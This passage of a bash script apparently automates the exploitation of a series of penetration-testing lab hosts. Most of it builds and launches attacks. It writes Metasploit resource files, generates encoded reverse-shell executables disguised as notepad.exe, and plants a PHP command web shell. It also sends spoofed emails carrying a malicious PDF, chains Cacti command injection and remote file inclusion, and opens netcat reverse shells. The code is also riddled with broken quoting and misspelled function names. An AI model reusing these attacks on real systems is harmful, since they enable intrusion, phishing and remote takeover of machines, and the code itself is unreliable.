         echo "ftp put exec$toctet.asp exec$toctet.asp" >> $msfs/bob/bobftp$toctet.txt
         echo "lcd /usr/share/windows-binaries/" >> $msfs/bob/bobftp$toctet.txt
         echo "ftp put plink.exe plink.exe" >> $msfs/bob/bobftp$toctet.txt
         echo "ftp bye" >> $msfs/bob/bobftp$toctet.txt
         echo "exit 0" >> $msfs/bob/bobftp$toctet.txt
    fi;
  }
  evilBobFTP;
  howtoRoute() {
    checthebrakesTop;
    echo -e "\t[*] Do you wish to use plink or autoroute?\n\t\t[*] Please type [plink] or [auto]"
    checthebrakesBot
    read autop
    if [ $autop == "plink" ]; 
      then
        if [ "`netstat -antelop | grep -E "sshd" | tr -s " " | cut -d " " -f6 | sort -u`" != "LISTEN" ]; 
          then
            checkthebrakesTop;
            echo -e "\t[*] Stopping SSHD as needed for Exploitation of Bob"
            checkthebrakesBot;
            # must have sshd service enabled for Plink to connect via SSH
            systemctl start ssh;
        fi;
        sleep 5;
        checkthebrakesTop;
        echo -e "\t[*] Starting Automated FTP Uploader, Ckermit"
        checkthebrakesBot;
        (makeXtermLog "Bobs$toctet_Automated_FTP_uploader" "kermit $msfs/bob/bobftp$toctet.txt" &) >/dev/null;
        sleep 60;
        checkthebrakesTop;
        echo -e "\t[*] Starting Evil ASP EXEC Wget Spider"
        checkthebrakesBot;
        (makeXtermLog "Bobs$toctet_Evil_EXEC_ASP_Page" "wget --spider http://$uip/bobExec$toctet.asp" &) >/dev/null
        sleep 60;
        (makeXtermLog "NetAPI_Plink_Bob_localhost" "$msfc -r $msfs/bob/bobPlink$toctet.rc" &) >/dev/null
        sleep 60;
    fi;
    if [ $autop == "auto" ];
      then
        sleep 10  
        checkthebrakesTop;
        echo -e "\t[*] Starting AutoRoute RC Handler"
        checkthebrakesBot;
        (makeXtermLog "Bobs_Autoroute_RC_Handle" "$msfc -r $msfs/bob/bobAutoroute$toctet.rc" &) >/dev/null
        sleep 5;
        checkthebrakesTop;
        echo -e "\t[*] Starting Automated FTP Uploader, Ckermit"
        checkthebrakesBot;
        (makeXtermLog "Bobs FTP Ckermit uploader" "kermit $msfs/bob/bobftp$toctet.txt" &) > /dev/null
        sleep 20;
        checkthebrakesTop;
        echo -e "\t[*] Starting Evil ASP EXEC Wget Spider"
        checkthebrakesBot;
        (makeXtermLog "Bobs$toctet_Evil_EXEC_ASP_Page" "wget --spider http://$uip/bobExec$toctet.asp" &) >/dev/null
    fi;
    if [ $autop == "" ]; 
      then
        exit
    fi;
  fi;
  }
  howtoRoute;
  checkthebrakesTop;
  echo -e "\t[*] Finished Bob Exploitation"
  checkthebrakesBot;
}
################################################################################
#~~~~~~~~~~~~~~~~> ORACLE CONFIGURATION AND EXPLOITATION SECTION <~~~~~~~~~~~~~~~~#
################################################################################
talkTotheOracle() {
  if [ $toctet == "11" ];
    then
      AttackerIP=$lh1
    elif [ $toctet == "13" ];
      then
        AttackerIP=$lh2
    elif [ $toctet == "15" ];
      then
        AttackerIP=$lh3
  fi;
  # start oracle resource files
  oracleRC() {
    if [ ! -f $msfs/oracle$toctet.rc" ];
      then
        checkthebrakesTop;
        echo -e "\t[*] Producing file: $msfs/oracle$toctet.rc"
        checkthebrakesBot;
        echo "use $oracleExploit" > $msfs/oracle$toctet.rc
        echo "set rhost $uip" >> $msfs/oracle$toctet.rc
        echo "set lhost $AttackerIP" >> $msfs/oracle$toctet.rc
        echo "set lport $lp" >> $msfs/oracle$toctet.rc
        echo "set payload $pay" >> $msfs/oracle$toctet.rc
        echo "set $DPH" >> $msfs/oracle$toctet.rc
        echo "exploit" >> $msfs/oracle$toctet.rc
        echo "sleep 5" >> $msfs/oracle$toctet.rc
        echo "exit" >> $msfs/oracle$toctet.rc
    fi;
  }
  oracleRC;
  oracleExploit() {
    # start oracle exploitation
    checkthebrakesTop;
    echo -e "\t[*] Producing file: $msfs/oracle$toctet.rc"
    checkthebrakesBot;
    (makeXtermLog "Oracle-Exploitation" "$msfc -r $msfs/oracle$toctet.rc" &) >/dev/null
  }
  oracleExploit;
  checkthebrakesTop;
  echo -e "\t[*] Finished Oracle Exploitation"
  checkthebrakesBot;
}
################################################################################
#~~~~~~~~~~~~~~~~> PEDRO CONFIGURATION AND EXPLOITATION SECTION <~~~~~~~~~~~~~~~~#
################################################################################
PedroSanchez() {
  # checks for hmailserver Jumbo version of john
  pedroJohn() {
    if [ "`john --format=hmailserver 2>&1 | cut -d" " -f1`" != "Password" ];
      then
        checkthebrakesTop;
        echo -e "\t[*] The JTR installed on your system DOES NOT support hmailserver formats"
        checkthebrakesBot;
    fi;
  }
  pedroJohn;
  perdoRC() {
    # make the directory to store the pdf's in
    if [ ! -d $msfs/pedro ];
      then
        checkthebrakesTop;
        echo -e "\t[*] Producing Dir: $msfs/pedro"
        checkthebrakesBot;
        mkdir $msfs/pedro
    fi
    # produce the recourse files for msf pdf creation
    if [ ! -f $msfs/pedro/pedro$toctet.rc" ];
      then
        checkthebrakesTop;
        echo -e "\t[*] Producing file: $msfs/pedro/pedro$toctet.rc"
        checkthebrakesBot;
        echo "use $pedroExploit" > $msfs/pedro$toctet/pedro$toctet.rc
        echo "set FILENAME $msfs/pedro$toctet/pedro$toctetreport.pdf" >> $msfs/pedro$toctet/pedro$toctet.rc
        echo "set lhost $AttackerIP" >> $msfs/pedro$toctet/pedro$toctet.rc
        echo "set lport $lp" >> $msfs/pedro$toctet/pedro$toctet.rc
        echo "set payload $pay" >> $msfs/pedro$toctet/pedro$toctet.rc
        echo "set $DPH" >> $msfs/pedro$toctet/pedro$toctet.rc
        echo "exploit" >> $msfs/pedro$toctet/pedro$toctet.rc
        echo "sleep 25" >> $msfs/pedro$toctet/pedro$toctet.rc
        echo "exit" >> $msfs/pedro$toctet/pedro$toctet.rc
    fi;
  }
  perdroRC;
  # make the emails to send to pedro spoofed from jeff
  makeEvilPDF() {
    if [ ! -f $msfs/pedro/report$toctet.pdf ]; 
      then
        checkthebrakesTop;
        echo -e "\t[*] Producing file: $msfs/pedro/report$toctet.pdf"
        checkthebrakesBot;    
        (makeXtermLog "Pedro-Spoofed-Email" "$msfc -r $msfs/pedro$toctet/pedro$toctet.rc" &) >/dev/null
    fi;
  }
  makeEvilPDF;
  makeFakeEmail() {
    checkthebrakesTop;
    echo -e "\t[*] Staging fake eMail with file: $msfs/pedro/report$toctet.pdf"
    checkthebrakesBot;  
    (makeXtermLog "Pedro-Spoofed-Email" "sendEmail \
          -s 10.10.11.229 \
          -xu jeff@thinc.local \
          -xp password \
          -f jeff@thinc.local \
          -t pedro@thinc.local \
          -u report \
          -m 'It is not meterpreter I swear....' \
          -a $msfs/pedro$toctet/report$toctet.pdf" &) >/dev/null
  }
  makeFakeEmail;
  checkthebrakesTop;
  echo -e "\t[*] Finished Exploiting Pedro"
  checkthebrakesBot; 
}
#
################################################################################
#~~~~~~~~~~~~~~> PHOENIX CONFIGURATION AND EXPLOITATION SECTION <~~~~~~~~~~~~~~#
################################################################################
#
# start Phoenix
RiseofthePhoenix() {
  PhoneixCheck() {
    # make phoenix dir and web dir for shell
    if [ ! -d $msfs/phoenix ]; 
      then
        checkthebrakesTop;
        echo -e "\t[*] Producing Dir: $msfs/phoenix "
        checkthebrakesBot;
        mkdir $msfs/phoenix
    fi;
    if [ ! -d $webdir/phoenix/ ];
      then
        checkthebrakesTop;
        echo -e "\t[*] Producing Dir: $webdir/phoenix "
        checkthebrakesBot;
        mkdir $webdir/phoenix/
     fi;
  }
  PhoenixCheck;
  checkmonkey;
  makePhoenixPHP() {
    #makes the reverse shell php for phoenix
    if [ ! -f $msfs/pedro/phoenix$toctet.php ]; 
       then
         checkthebrakesTop;
         echo -e "\t[*] Producing file: $msfs/pedro/phoenix$toctet.php "
         checkthebrakesBot;
         cat $msfs/php-reverse-shell-1.0/php-reverse-shell.php |\
           sed -r "s/(ip = )(.*)/\1'$AttackerIP';/g" |\
           sed -r "s/(port = )(.*)/\1 80;/g" > $msfs/phoenix/phoenix$toctet.php
         cp $msfs/phoenix/phoenix$toctet.php $webdir/phoenix/phoenix$toctet.php
    fi;
  }
  makePhoenixPHP;
  PhoenixExploit() {
    checkthebrakesTop;
    echo -e "\t[*] Prepairing to exploit Phoenix "
    checkthebrakesBot;
    systemctl stop apache2
    a2enmod php7.0
    systemctl start apache2
    sleep 5
    checkthebrakesTop;
    echo -e "\t[*] Phoenix Exploitation Stage1 NC Listener "
    checkthebrakesBot;
    (makeXtermLog "Phoenix-Exploitation" "nc -l -v -p 80" &) >/dev/null
    sleep 5
    checkthebrakesTop;
    echo -e "\t[*] Phoenix Exploitation Stage2 wget request "
    checkthebrakesBot;
    (makeXtermLog "Phoenix-Exploitation-Stage2" "wget http://10.10.11.208/internal/advanced_comment_system/index.php?ACS_path=http://$AttackerIP/phoenix/phoenix$toctet.php? && \
       rm ./index.php\?ACS_path\=http\:%2F%2F$AttackerIP%2Fphoenix%2Fphoenix$toctet.php" &) >/dev/null
    sleep 10
    checkthebrakesTop;
    echo -e "\t[*] Killing Phoenix Exploitation Stages "
    checkthebrakesBot;
    killall -9 wget
    ps -A xf |\
      grep "nc -l -v -p 8080" |\
      grep -v grep |\
      tr -s " " |\
      cut -d" " -f2 |\
      xargs kill -9
  }
  PhoenixExploit;
  checkthebrakesTop;
  echo -e "\t[*] Finished Phoenix Exploitation "
  checkthebrakesBot;
}
#
################################################################################
#~~~~~~~~~~~~~~~> CACTI CONFIGURATION AND EXPLOITATION SECTION <~~~~~~~~~~~~~~~#
################################################################################
#
# start Cacti """ takes about 4m., to get root on this machine """
CactiSpine() {
  cactiStore() {
    # make cacti dir for storage
    if [ ! -d $webdir/cacti/ ]; 
      then
        checkthebrakesTop;
        echo -e "\t[*] Producing Dir: $webdir/cacti "
        checkthebrakesBot;
        mkdir $webdir/cacti/
    fi;
  }
  cactiStore;
  cactiWebShell() {
    # produce web shell to get root 
    if [ ! -f $webdir/cacti/cacti$toctetmsf ];
      then
        checkthebrakesTop;
        echo -e "\t[*] Producing file: $webdir/cacti/cacti$toctetmsf "
        checkthebrakesBot;
        msfvenom -p $lrs LHOST=$AttackerIP LPORT=8080 X > $webdir/cacti/cacti$toctetmsf
    fi;
  }
  cactiWebShell;
  cactiLocalExploit() {
    # produce local root exploit to web dir
    if [ ! -f $webdir/cacti/cactiroot$toctet.sh ]; 
      then
        checkthebrakesTop;
        echo -e "\t[*] Producing file: $webdir/cacti/cactiroot$toctet.sh "
        checkthebrakesBot;
        cp /usr/share/exploitdb/platforms/linux/local/2011.sh $webdir/cacti/cactiroot$toctet.sh
    fi;
  }
  cactiLocalExploit;
    # check ensure apache is operational with php5
  checkCactiServices() {
    if [ "`netstat -antelop | tr -s " " | grep "apache" | cut -d" " -f6`" == "LISTEN" ]; 
      then
        checkthebrakesTop;
        echo -e "\t[*] Stopping services inn order to exploit Cacti "
        checkthebrakesBot;
        systemctl stop apache2
        a2enmod php7.0
        systemctl start apache2
      else
        checkthebrakesTop;
        echo -e "\t[*] Stopping services inn order to exploit Cacti "
        checkthebrakesBot;
        a2enmod php7.0
        systemctl start apache2
    fi;
  }
  checkCactiServices;
  AttackonCacti() {
    # start attack on cacti
    checkthebrakesTop;
    echo -e "\t[*] Stopping services in order to exploit Cacti "
    checkthebrakesBot;
    checkthebrakesTop;
    echo -e "\t[*] Starting Cacti Exploition Phase1 "
    checkthebrakesBot;    
    (makeXtermLog "Cacti-PHP-CMD-Injection-Phase1" "php /usr/share/exploitdb/platforms/php/webapps/3029.php $uip  /cacti/ wget http://$AttackerIP/cacti/cacti$toctetmsf -O /tmp/cacti$toctetmsf && \
              php /pentest/exploits/exploitdb/platforms/php/webapps/3029.php $uip  /cacti/ wget http://$AttackIP/cacti/nc -O /tmp/nc && \
              php /pentest/exploits/exploitdb/platforms/php/webapps/3029.php $uip  /cacti/ chmod 755 /tmp/nc && \
              php /pentest/exploits/exploitdb/platforms/php/webapps/3029.php $uip  /cacti/ chmod 755 /tmp/cacti$toctetmsf" &) >/dev/null
    checkthebrakesTop;
    echo -e "\t[*] Starting Cacti Exploition Phase2 "
    checkthebrakesBot;   
    (makeXtermLog "Cacti-WebShell-Phase2" "echo -e "wget http://$AttackerIP/cacti/cactiroot$toctet.sh -O /tmp/cactiroot$toctet.sh";
              sleep 5;
              chmod 755 /tmp/cactiroot$toctet.sh;
              /tmp/cactiroot$toctet.sh" | nc -lvp 8080" &) >/dev/null
    sleep 30
    checkthebrakesTop;
    echo -e "\t[*] Starting Cacti Exploition Phase3 "
    checkthebrakesBot;   
    (makeXtermLog "Cacti PHP CMD Injection-Phase3" "/pentest/exploits/exploitdb/platforms/php/webapps/3029.php $uip  /cacti/ /tmp/cacti$toctetmsf &
    echo -e "\n\n\t\t[*] Taking a 300 second nap...." 
    sleep 300s
    checkthebrakesTop;
    echo -e "\t[*] Starting Cacti Exploition Phase4 "
    checkthebrakesBot;   
    (makeXtermLog "Cacti-root-user-info-Phase4" "echo -e "whoami\nifconfig" | nc -lvp 8081 &) >/dev/null
    checkthebrakesTop;
    echo -e "\t[*] Starting Cacti Exploition Phase5 "
    checkthebrakesBot;
    (makeXtermLog "Cacti-PHP-CMD-Injection-Phase5" "php /pentest/exploits/exploitdb/platforms/php/webapps/3029.php $uip  /cacti/ /tmp/nc $AttackIP 8081 -e /tmp/s &) >/dev/null
    sleep 120s
    checkthebrakesTop;
    echo -e "\t[*] Cleaning-up the Cacti Exploition Phases "
    checkthebrakesBot;
    ps -A xf |\
      grep  "nc -lvp 8080" |\
      grep xterm |\
      grep -v "grep" |\
      cut -d" " -f1 |\
      xargs kill -9
    ps -A xf |\
      grep "root user PHP" |\
      grep xterm |\
      grep -v "grep" |\
      cut -d" " -f1 |\
      xargs kill -9
  }
  AttackonCacti;
 checkthebrakesTop;
 echo -e "\t[*] Finished the Cacti Exploition "
 checkthebrakesBot;
}
#
################################################################################
#~~~~~~~~~~~~~~> TrixBox CONFIGURATION AND EXPLOITATION SECTION <~~~~~~~~~~~~~~#
################################################################################
#
# start trixbox root shell from SOME 0day 
SillyRabbit() {
  # start trixbox exploitation
  checkthebrakesTop;
  echo -e "\t[*] Starting the TrixBoox NC listener "
  checkthebrakesBot;
  (makeXtermLog "TrixBox-Root-Shell" "nc -lvp 8082 &") >/dev/null
  checkthebrakesTop;
  echo -e "\t[*] Starting the TrixBoox Exploitation process "
  checkthebrakesBot;
  (makeXtermLog "TrixBox-Exploitation" "python /usr/share/exploitdb/platforms/linux/remote/6045.py $uip 80 $AttackerIP 8082 &) >/dev/null
  cleantheBowl() {
    ps -A xf |\
      grep -v grep |\
      grep "6045.py" |\
      grep xterm |\
      cut -d" " -f1 |\
      xargs kill -9
  }
  cleantheBowl;
  checkthebrakesTop;
  echo -e "\t[*] Finished the TrixBoox Exploitation process "
  checkthebrakesBot;
}
#
################################################################################
#~~~~~~~~~~~~~~> MSFPRO1 CONFIGURATION AND EXPLOITATION SECTION <~~~~~~~~~~~~~~#
################################################################################
#
# Start MSFBOX1
MSFPRO1() {
  checkthebrakesTop;
  echo "MSFPRO BOX"
  echo "u:SOMEPWD p:PASSWORD"
  echo "https:\\localhost:3790 u:SOMEPWD p:SOMEPASSWORD"
  echo -e "\n\n\tto get root: sudo su"
  checkthebrakesBot;
}
MSFPRO1;
#
################################################################################
#~~~~~~~~~~~~~~> MSFPRO2 CONFIGURATION AND EXPLOITATION SECTION <~~~~~~~~~~~~~~#
################################################################################
#
# Start MSFBOX2
MSFPRO2() {
  checkthebrakesTop;
  echo "MSFPRO BOX"
  echo "u:SOMEPWD p:PASSWORD"
  echo "https:\\localhost:3790 u:SOMEPWD p:SOMEPASSWORD"
  echo -e "\n\n\tto get root: sudo su"
  checkthebrakesBot;
}
MSFPRO2;
#
################################################################################
#~~~~~~~~~~~~~> REDHAT SMB CONFIGURATION AND EXPLOITATION SECTION <~~~~~~~~~~~~#
################################################################################
#
# start Redhat SMB exploit
RedHatHaXoR() {
  checkthebrakesTop;
  echo -e "\t[*] Starting the RedHat SMB Exploitation process "
  checkthebrakesBot;
  (makeXtermLog "RedHat-SMB-2.2" "perl /usr/share/exploitdb/platforms/linux/remote/7.pl -t linx86 -H $AttackerIP -h $uip" &) > /dev/null
  checkthebrakesTop;
  echo -e "\t[*] Finished the RedHat SMB  Exploitation process "
  checkthebrakesBot;
}
#
################################################################################
#~~~~~~~~~~~~~> REDHAT 9 CONFIGURATION AND EXPLOITATION SECTION <~~~~~~~~~~~~~~#
################################################################################
#
#  start redhat9 
RedHatHaXin9() {
  makeRH9RC() {
    # make the resource files for redhat9
    if [ ! -f  $msfs/redhat9$toctet.rc ];
      then
        checkthebrakesTop;
        echo -e "\t[*] Producing file: $msfs/redhat9$toctet.rc "
        checkthebrakesBot;      
        echo "use $rh9Exploit" > $msfs/redhat9$toctet.rc
        echo "set rhost $uip" >> $msfs/redhat9$toctet.rc
        echo "set lhost $AttackerIP" >> $msfs/redhat9$toctet.rc
        echo "set lport $lp" >> $msfs/redhat9$toctet.rc
        echo "set payload $lmr" >> $msfs/redhat9$toctet.rc
        echo "set $DPH" >> $msfs/redhat9$toctet.rc
        echo "exploit" >> $msfs/redhat9$toctet.rc
        echo "exit" >> $msfs/redhat9$toctet.rc
    fi
  }
  makeRH9RC;
  RH9Exploit() {
    # start the exploitation process for redhat9
    checkthebrakesTop;
    echo -e "\t[*] Starting RedHat9 Exploitation process "
    checkthebrakesBot;  
    (makeXtermLog "Redhat-9-Exploitation" "$msfc -r $msfs/redhat9$toctet.rc" &) >/dev/null
  }
  RH9Exploit;
}
#
################################################################################
#~~~~~~~~~~~~~~> MASTER CONFIGURATION AND EXPLOITATION SECTION <~~~~~~~~~~~~~~~#
################################################################################
#
#  start Master
MasterAttack() {
  masterRC() {
    # start master recourse file creation
    if [ ! -f  $msfs/master$toctet.rc ];
      then
        checkthebrakesTop;
        echo -e "\t[*] Producing file: $msfs/master$toctet.rc "
        checkthebrakesBot; 
        echo -e "use $masterExploit" > $msfs/master$toctet.rc
        echo -e "set rhost $uip">> $msfs/master$toctet.rc
        echo -e "set lhost $AttackerIP">> $msfs/master$toctet.rc
        echo -e "set lport $lp">> $msfs/master$toctet.rc
        echo -e "set payload $pay">> $msfs/master$toctet.rc
        echo -e "set $DPH">> $msfs/master$toctet.rc
        echo -e "exploit">> $msfs/master$toctet.rc
        echo -e "exit" >> $msfs/master$toctet.rc
    fi;
  }
  masterRC;
  MasterExploiter() {
    # start master exploitation process
    checkthebrakesTop;
    echo -e "\t[*] Starting the Exploitation of Master "
    checkthebrakesBot;
    (makeXtermLog "Master-Exploitation" "$msfc -r $msfs/master$toctet.rc" &) >/dev/null
  }
  MasterExploiter;
  checkthebrakesTop;
  echo -e "\t[*] Finished Exploitation of Master "
  checkthebrakesBot; 
} 
#
################################################################################
#~~~~~~~~~~~~~~> SLAVE CONFIGURATION AND EXPLOITATION SECTION <~~~~~~~~~~~~~~~#
################################################################################
#
# start slave 
SexSlave() {
  slaveRC() {
    if [ ! -f  $msfs/slave$toctet.rc ];
      then
        checkthebrakesTop;
        echo -e "\t[*] Producing file: $msfs/slave$toctet.rc "
        checkthebrakesBot; 
        echo "use slaveExploit" > $msfs/slave$toctet.rc
        echo "set rhost $uip" >> $msfs/slave$toctet.rc
        echo "set lhost $AttackerIP" >> $msfs/slave$toctet.rc
        echo "set lport $lp" >> $msfs/slave$toctet.rc
        echo "set payload $pay" >> $msfs/slave$toctet.rc
        echo "set $DPH" >> $msfs/slave$toctet.rc
        echo "exploit" >> $msfs/slave$toctet.rc
        echo "exit" >> $msfs/slave$toctet.rc
    fi;
  }
  slaveRC;
  slaveExploit() {
    # start slave exploitation process
    checkthebrakesTop;
    echo -e "\t[*] Starting the Exploitation of Slave "
    checkthebrakesBot;
    (maskeXtermLog "Salve-Exploitation" "$msfc -r $msfs/master$toctet.rc" &) >/dev/null
  }
  slaveExploit;
  checkthebrakesTop;
  echo -e "\t[*] Finished Exploitation of Slave "
  checkthebrakesBot; 
}
#
################################################################################
#~~~~~~~~~~~~~> MAILMAN CONFIGURATION AND EXPLOITATION SECTION <~~~~~~~~~~~~~~~#
################################################################################
#
# start mail man
MailMan() {
  # start mail man exploitation
  checkthebrakesTop;
  echo -e "\t[*] Starting the Exploitation of MailMan "
  checkthebrakesBot;
  (makeXtermLOg "MailMan-RH-SMB" "perl /usr/share/exploitdb/platforms/linux/remote/7.pl \
    -t linx86 \
    -H $AttackerIP \
    -h $uip" &) >/dev/null
}
checkthebrakesTop;
echo -e "\t[*] Finished the Exploitation of MailMan "
checkthebrakesBot;
#
################################################################################
#~~~~~~~~~~~~~~> JEFF CONFIGURATION AND EXPLOITATION SECTION <~~~~~~~~~~~~~~~~#
################################################################################
#
# start jeff 
djJazzy() {
  jeffprep() {
    # make jeff web directory 
    if [ ! -d  $webdir/jeff ];
      then
        checkthebrakesTop;
        echo -e "\t[*] Producing Dir: $webdir/jeff "
        checkthebrakesBot; 
        mkdir $webdir/jeff
    fi;
  }
  jeffprep;
  jeffshell() {
    # make jeff reverse https shell
    if [ ! -f $webdir/jeff/notepad$toctet.exe ];
      then
        checkthebrakesTop;
        echo -e "\t[*] Producing file: $webdir/jeff/notepad$toctet.exe "
        checkthebrakesBot;
        $msfv -p $pay LHOST=$AttackerIP LPORT=$lp R \
        -e x86/shikata_ga_nai -c 2 \
        -t exe -o $webdir/jeff/notepad$toctet.exe
    fi;
  }
  jeffshell;
  eviljeff() {
    # makes evil php for execution of commands in webdav
    if [ ! -f $webdir/jeff/get$toctet.php ];
      then
        checkthebrakesTop;
        echo -e "\t[*] Producing file: $webdir/jeff/get$toctet.php "
        checkthebrakesBot;
        echo "<?php @system(\$_GET['cmd']); ?>" > $webdir/jeff/get$toctet.php
    fi;
  }
  eviljeff;
  deadjeff() {
    # make jeff cadaver rc file
    if [ ! -f $webdir/jeff/cadaver$toctet.rc ];
      then
        checkthebrakesTop;
        echo -e "\t[*] Producing file: $webdir/jeff/cadaver$toctet.rc "
        checkthebrakesBot;
        echo "open http://$uip/webdav" > $webdir/jeff/cadaver$toctet.rc
        echo "put $webdir/jeff$toctet/cadaver.rcnotepad.exe notepad.exe" >> $webdir/jeff/cadaver$toctet.rc
        echo "put $webdir/jeff$toctet/cadaver.rcget.php get.php" >> $webdir/jeff/cadaver$toctet.rc
        echo "quit" >> $webdir/jeff/cadaver$toctet.rc
    fi;
  }
  ExploitJeff() {
    # start jeff exploitation process
    checkthebrakesTop;
    echo -e "\t[*] Starting the Exploitation of Jeff "
    checkthebrakesBot;
    echo -e "wampp\nxampp\n" |\
      cadaver -r $webdir/jeff$toctet/cadaver.rc
    wget http://$uip/$webdav/get$toctet.php?cmd=c:\\xampp\\webdav\\notepad$toctet.exe%00
    sleep 30
    killall -9 wget
  }
  ExploitJeff;
  checkthebrakesTop;
  echo -e "\t[*] Finished the Exploitation of Jeff "
  checkthebrakesBot;
}
#
################################################################################
#~~~~~~~~~~~~~~> CSCART CONFIGURATION AND EXPLOITATION SECTION <~~~~~~~~~~~~~~~#
################################################################################
#
# start ubuntu 224 cscart                  
cscartfsk() {
  makewebdir() {
    if [ ! -d $webdir/cscart ]; 
      then
       checkthebrakesTop;
       echo -e "\t[*] Producing Dir: $webdir/cscart "
       checkthebrakesBot;
       mkdir $webdir/cscart
    fi;
  }
  makewebdir;
  makeFSK() {
    # make the fsk exploit and correct for the environment
    if [ ! -f $webdir/cscart/cscartfsk$toctet.php ];
      then
        checkthebrakesTop;
        echo -e "\t[*] Producing file: $webdir/cscart/cscartfsk$toctet.php "
        checkthebrakesBot;
        cat /usr/share/exploitdb/platforms/php/webapps/1964.php |\
          sed -r 's/(\$packet=\"POST \"\.\$p\.\")(.*)/\1classes\/fckeditor\/editor\/filemanager\/browser\/default\/connectors\/php\/connector\.php\?Command\=FileUpload\&Type\=File\&CurrentFolder\= HTTP\/1\.0\\r\\n\"\;/g' |\
          sed -r 's/(\$packet\=\"GET \"\.\$p\.\"images\/)(.*)/\1"\.\$filename\.\" HTTP\/1\.0\\r\\n\"\;/g' > $webdir/cscart/cscartfsk$toctet.php
    fi;
  }
  makeFSK;
  makeCSExploit() {
    # make local root exploit
    if [ ! -f $webdir/cscart/36038-6$toctet.c ]; 
      then
        checkthebrakesTop;
        echo -e "\t[*] Producing file: $webdir/cscart/36038-6$toctet.c "
        checkthebrakesBot;
        wget http://downloads.securityfocus.com/vulnerabilities/exploits/36038-6.c -o $webdir/cscart/36038-6$toctet.c
       checkthebrakesTop;
       echo -e "\t[*] Compiling SendSocket Exploit for CSCart "
       checkthebrakesBot;
       gcc -w $webdir/cscart/36038-6$toctet.c -o $webdir/cscart/send-socket$toctet
    fi;
  }
  makeCSExploit;
  doCSExploit() {
    # exploit systems with command execution and local root + nc shell reverse
    checkthebrakesTop;
    echo -e "\t[*] Starting the Exploitation of CSCart "
    checkthebrakesBot;
    (makeXtermLog "CSCart_NetCat_Listener" "nc -lvp 8080" &) >/dev/null
    (makeXtermLog "CSCart_PHP_Exploit" "CSCart php $webdir/cscart/cscartfsk$toctet.php $uip / wget http://$AttackerIP/cscart/send-socket &") >/dev/null
    sleep 30s
    (makeXtermLog "CSCart_PHP_SendSOcket_Exploit" "php $webdir/cscart/cscartfsk$toctet.php $uip / echo -e "./send-socket\n" |\
        /bin/nc 10.10.10.12 8080 -e /bin/sh' &) >/dev/null
  }
  doCSExploit;
  checkthebrakesTop;
  echo -e "\t[*] Finished the Exploitation of CSCart "
  checkthebrakesBot;
}
#
################################################################################
#~~~~~~~~~~~~~~~> ITJOE CONFIGURATION AND EXPLOITATION SECTION <~~~~~~~~~~~~~~~#
################################################################################
#
# start IT Joe .... Now to pivot or Not to pivot... tis is the question
ITJoe() {
  #  [ `grep "0x7c86fed3" /pentest/exploits/framework3/modules/exploits/windows/tftp/attftp_long_filename.rb  | tr -s "\t" " "  | cut -d" " -f9` == "0x7c86fed3" ]; then
  ITJoeRC() {                
    if [ ! -f $msfs/joe$toctet.rc ];
      then 
        checkthebrakesTop;
        echo -e "\t[*] Producing file: $msfs/joe$toctet.rc "
        checkthebrakesBot;
        echo "use $itjoeExploit" > $msfs/joe$toctet.rc
        echo "set rhost $uip" >> $msfs/joe$toctet.rc
        echo "set lhost $AttackerIP" >> $msfs/joe$toctet.rc
        echo "set $DPH" >> $msfs/joe$toctet.rc
        echo "set lport $lp" >> $msfs/joe$toctet.rc
        echo "set target 9" >> $msfs/joe$toctet.rc
        echo "set payload windows/meterpreter/reverse_nonx_tcp" >> $msfs/joe$toctet.rc
        echo "exploit" >> $msfs/joe$toctet.rc
        #echo "exit" >> $msfs/joe$toctet.rc
      fi;
  }
  ITJoeRC;
  ExploitITJoe() {
    # start exploitation process
    checkthebrakesTop;
    echo -e "\t[*] Starting Exploitation of ITJoe "
    checkthebrakesBot;
    (makeXtermLog "ITJoe_Exploitation" "$msfc -r $msfs/joe$toctet.rc" &) >/dev/null
  }
  ExploitITJoe;
  checkthebrakesTop;
  echo -e "\t[*] Finished Exploitation of ITJoe "
  checkthebrakesBot;
}
#
################################################################################
#~~~~~~~~~~~~~~~> WebSQL CONFIGURATION AND EXPLOITATION SECTION <~~~~~~~~~~~~~~#
################################################################################
#
# start websql 
WebSQL() {
  WebSQLRC() {
    # make websql srv resource files
    if [ ! -f $msfs/SQLsrv$toctet.rc ];
      then 
        checkthebrakesTop;
        echo -e "\t[*] Producing file: $msfs/SQLsrv$toctet.rc "
        checkthebrakesBot;
        echo "use $WebSQLExploit" > $msfs/SQLsrv$toctet.rc
        echo "set target 0" >> $msfs/SQLsrv$toctet.rc
        echo "set rhost $uip" >> $msfs/SQLsrv$toctet.rc
        echo "set lhost $AttackerIP" >> $msfs/SQLsrv$toctet.rc
        echo "set $DPH" >> $msfs/SQLsrv$toctet.rc
        echo "set lport $lp" >> $msfs/SQLsrv$toctet.rc
        echo "set payload $pay" >> $msfs/SQLsrv$toctet.rc
        echo "exploit" >> $msfs/SQLsrv$toctet.rc
        echo "exit" >> $msfs/SQLsrv$toctet.rc
    fi;
  }
  WebSQLRC;
  WebSQLXPL() {
    # start exploitation process of websql srv
    checkthebrakesTop;
    echo -e "\t[*] Starting the Exploitation of WebSQL "
    checkthebrakesBot;
    (makeXtermLog "WebSQL_Exploitation" "$msfc -r $msfs/srv$toctet.rc" &) >/dev/null
  }
  WebSQLXPL;
  checkthebrakesTop;
  echo -e "\t[*] Finished the Exploitation of WebSQL "
  checkthebrakesBot;
}
#
################################################################################
#~~~~~~~~~~~~~~> ThinMail CONFIGURATION AND EXPLOITATION SECTION <~~~~~~~~~~~~~#
################################################################################
#
# start ThinMail
ThinMail() {
  makeThinRC() {
    if [ ! -f $msfs/thinmail$toctet.rc ];
      then
        checkthebrakesTop;
        echo -e "\t[*] Producing file: $msfs/thinmail$toctet.rc "
        checkthebrakesBot;
        echo "use $ThinMailExploit" > $msfs/thinmail$toctet.rc
        echo "set RHOST $uip" >> $msfs/thinmail$toctet.rc
        echo "set LHOST $AttackerIP" >> $msfs/thinmail$toctet.rc
        echo "set LPORT $lp" >> $msfs/thinmail$toctet.rc
        echo "set PAYLOAD $pay" >> $msfs/thinmail$toctet.rc
        echo "set $DPH" >> $msfs/thinmail$toctet.rc
        echo "exploit" >> $msfs/thinmail$toctet.rc
        echo "exit" >> $msfs/thinmail$toctet.rc
    fi;
  makeThinRC;
  }
  ThinkMailEXP() {
    # start thinmail exploitation process
    checkthebrakesTop;
    echo -e "\t[*] Starting Exploitation of ThinMail "
    checkthebrakesBot;
    (MakeXtermLog "ThinMail-Exploitation" "$msfc -r $msfs/thinmail$toctet.rc" &) >/dev/null
  }
  ThinkMailEXP;
  checkthebrakesTop;
  echo -e "\t[*] Finished Exploitation of ThinMail "
  checkthebrakesBot;
}
